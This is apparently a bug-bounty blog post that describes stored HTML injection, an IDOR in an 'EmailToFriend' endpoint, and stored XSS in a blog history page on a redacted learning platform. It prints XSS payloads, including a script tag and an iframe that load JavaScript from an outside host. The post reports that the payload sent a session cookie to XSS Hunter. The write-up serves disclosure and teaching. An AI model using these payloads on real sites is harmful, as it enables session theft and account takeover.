---
title: "XSS Meets IDOR: A Double Vulnerability Story on a Learning Platform 🔥"
description: "XSS Meets IDOR: A Double Vulnerability Story on a Learning Platform 🔥"
date: 2025-06-19
tags: ["xss", "idor", "bug-bounty"]
readTime: "5 min read"
---

![](/images/blog/xss-meets-idor/1__dSrfoTWqk0ySifsezdpFQ.jpeg)

📌 **Special thanks to** [**Shah kaif**](https://medium.com/u/10f677056bcd) — my dedicated learning partner — for collaborating on this research and finding.

_This write-up has been prepared under the guidance of_ [_Amish Patel_](https://medium.com/@cyberexpertamish)_,_ [_Lay Patel_](https://medium.com/@cynex) _at_ [_Hacker4Help_](https://medium.com/@hacker4help) _as part of our learning initiative on cybersecurity awareness._

![](/images/blog/xss-meets-idor/0_lbeYwtcuFjjpM6nP.gif)

* * *

## Introduction 🔍

In this write-up, I’ll walk you through the discovery of **two critical vulnerabilities** on a popular educational site:

-   A **Stored Cross-Site Scripting (XSS)** vulnerability via unsanitized user input.
-   An **Insecure Direct Object Reference (IDOR)** that exposes private blog content.
-   An Stored HTML Injection in Username.

* * *

## **🐞 Vulnerability #1: Stored HTML in Display Name**

During the account creation process on **\[redacted\].com**, I began exploring how the platform handles user input in the **full name** (username) field.

Initially, the frontend validation prevented me from entering any special characters or HTML tags.

![](/images/blog/xss-meets-idor/1_qD1T7WsNoTNQ_vjk-7FOGw.png)

However, being curious (and persistent), I opened up **Burp Suite** to intercept the registration request and manually modified the payload to include raw HTML:

### The Payload 🧪:

```
<h1>Holaaaa</h1>
```

![](/images/blog/xss-meets-idor/1_dDLYp9D9VyWbUJ6TTujrGQ.png)

I then **forwarded the request** to the server — and surprisingly, it worked.  
The account was successfully created with the display name: `<h1>holaa</h1>`

![](/images/blog/xss-meets-idor/0_ojlwBZqsaODKPArr.gif)

**ANDDD THE RESPONSE:**

![](/images/blog/xss-meets-idor/1_8l28WFqP2t2sXStcoz27Ow.png)

The resulting profile ⚠️ was now located at:

```
https://www.redacted.com/members/<h1>holaa</h1>
```

![](/images/blog/xss-meets-idor/0_ffhYhCchyjCW1UYt.gif)

### ⚠️ Why This Matters

Although visiting the profile page returned a `404 Not Found` (likely due to the special characters breaking routing logic), the more critical issue is:

-   The **unsanitized HTML was stored in the backend**
-   It could later be **rendered elsewhere on the platform**, triggering a **Stored XSS**

### 🎯 Real-World Impact

If this display name appears anywhere else — such as:

-   On blog posts
-   In comment sections
-   Inside an admin dashboard.

* * *

## 🐞 Vulnerability #2: Insecure Direct Object Reference (IDOR) in ID Parameter

While exploring other features on **\[redacted\].com**, I stumbled upon a seemingly harmless endpoint used to **share blog articles with a friend**:

```
<https://www.redacted.com/Articles/EmailToFriend.aspx?BlogID=96226>
```

Out of curiosity, I changed the numeric `BlogID` to a different value — and what happened next was unexpected (and dangerous).

## 🧪 The Flow

While exploring the blog system on **\[redacted\].com**, I created a **test blog** that contained a set of **XSS payloads**. After publishing it, I noticed a familiar set of **three dots (⋮)** on the blog post — a dropdown menu offering several options, including:

![](/images/blog/xss-meets-idor/1_Ts-QklEQHbd8VxUyS4BmAA.png)

> _“Email Blog to a Friend”_

Curious, I clicked on it. It redirected me to:

```
<https://www.redacted.com/Articles/EmailToFriend.aspx?BlogID=96230>
```

![](/images/blog/xss-meets-idor/0_Kfxh2i7sY8BnPuNw.gif)

And the Page was:

![](/images/blog/xss-meets-idor/1_UUZy1MlsHL3uf5B2O7D1Gg.png)

So, My Evil mind said:

![](/images/blog/xss-meets-idor/0_vtBD-XQffxbnulPx.gif)

All I did was change the BlogID parameter and that GAVE MEEEE:

![](/images/blog/xss-meets-idor/1_fs4cebCQwdhbZLPNjtAS4g.png)

## 📥 What I Saw

This page was **pre-filled with email content** meant to send a preview of my blog to someone:

```
Hello,This email is sent to you by Het (hetworkshard@gmail.com).Het has recommended you following Blog from RedactedBlog:Blog 1 - XSSDescription:CHECK <img src='x' onerror=alert(1)/> ... <iframe srcdoc="...">
```

The **payloads I had inserted into my blog description were rendered here**, completely unfiltered.

## 🔓 What This Means

This is a **clear case of IDOR (Insecure Direct Object Reference)**:

-   No auth check was in place
-   Blog drafts were referenced by a predictable ID (`BlogID`)
-   I could view other users’ blog data by simply modifying the parameter

Worse, if **other users had XSS payloads**, I could **trigger their JavaScript** and potentially:

-   Leak author emails
-   Trigger auto-send requests
-   Deliver malicious content to recipients

## 🔥 Combined XSS + IDOR = 💀

![](/images/blog/xss-meets-idor/0_rw28rFVGw1D3jSvH.gif)

In my case, this led to a successful **Stored XSS trigger** via the `EmailToFriend.aspx` interface.

The iframe-based payload even contained an encoded JavaScript snippet pointing to a **remote malicious JS file**, which would be executed if rendered:

```
<img src='x' onerror=alert(1)/><iframe srcdoc="...&#34;<https://js.rip/sdjsajkx&#34;.>..">
```

* * *

## 🐞 Vulnerability #3: Stored XSS Triggered in Blog’s History Preview

After successfully identifying XSS via the email feature and IDOR via blog IDs, I continued exploring the platform’s blog management UI — specifically those familiar **three vertical dots (⋮)** found on every blog post.

These dots offered multiple options like:

-   Edit blog
-   Email to friend
-   **View history**

It was the **“View History”** option that revealed a hidden gem — or more accurately, a **security nightmare**.

## 📜 The Flow

I had already created a blog with **malicious XSS payloads** in the title and description, as part of my testing:

```
"><script src="<https://js.rip/sdjsajkx>"></script>
```

Out of curiosity, I clicked on:

> _⋮ → View History_

The history section previewed all previous versions of my blog, including the version that contained the above payload.

## ⚠️ The Trigger

As soon as the **history page** loaded, the XSS payload inside the blog’s content **executed automatically** — right inside the browser.

But here’s the real kicker:

The request was sent silently to **XSS Hunter:**

```
<https://xsshunter.trufflesecurity.com/app/#/>
```

From there, I confirmed:

-   The **cookie was exfiltrated**
-   The **origin was** [**redacted.com**](http://redacted.com)
-   The **payload fired in a live, browser-rendered context**

The Preview of captured Info:

![](/images/blog/xss-meets-idor/1_EL66xFbcSV0Mrf56XnYm7Q.png)

![](/images/blog/xss-meets-idor/1_YJm-tFIO2E7D2w7e_Lr2tQ.png)

* * *

## About the Authors:

![](/images/blog/xss-meets-idor/0_moCuFsc9KX8GEyvn.gif)

-   [**Het Patel**](https://www.linkedin.com/in/hetpatel9) — Cybersecurity Enthusiast | Bug Hunter | Coffee Addict ☕
-   [**Kaif Shah**](https://www.linkedin.com/in/skaif009/) — Security Researcher | CEHv11 | CRTA | Top 4% THM | Bug Hunter

_Happy Hacking! (Ethically, of course)_ 😉🔒